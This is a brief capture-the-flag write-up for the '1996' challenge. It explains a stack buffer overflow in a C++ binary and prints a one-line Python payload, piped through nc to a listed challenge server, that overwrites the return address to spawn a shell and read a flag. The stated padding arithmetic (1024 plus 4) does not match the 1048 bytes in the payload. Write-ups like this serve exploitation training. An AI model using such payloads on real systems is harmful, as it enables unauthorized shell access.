# Challenge 1996

42 Points

## Challenge

It's 1996 all over again!
nc 35.207.132.47 22227

The challenge also contains a zip file with the source and the binary of the application behind the given network address.

Difficulty estimate: very easy

## Solution

The C++ code shows an obvious buffer overflow. With the input that can be given to the program, the buffer overflow can be exploited and the pointer to the "hidden" function can be put into the memory to execute and unintended jump.

First we had to find the size of the buffer. From the 1996.cpp file we found that the size is 1024 chars. To exploit program, we need to send at least 1024 characters. After the 1024 we also need 4 chars extra. After that, we can put the address to our function we want to execute (found with objdump -d 1996).

All it takes is a little bit of python:

```
(python -c "print '\x00'*1048+ '\x97\x08\x40\x00\x00\x00\x00\x00'"; cat -) | nc 35.207.132.47 22227
```

This can also be executed locally with the 1996 binary:
```
(python -c "print '\x00'*1048+ '\x97\x08\x40\x00\x00\x00\x00\x00'"; cat -) | ./1996
```

After this command a shell spawned and in the folder a flag.txt file and be found with the CTF flag. Can be displayed with a simple:

```
cat flag.txt
```
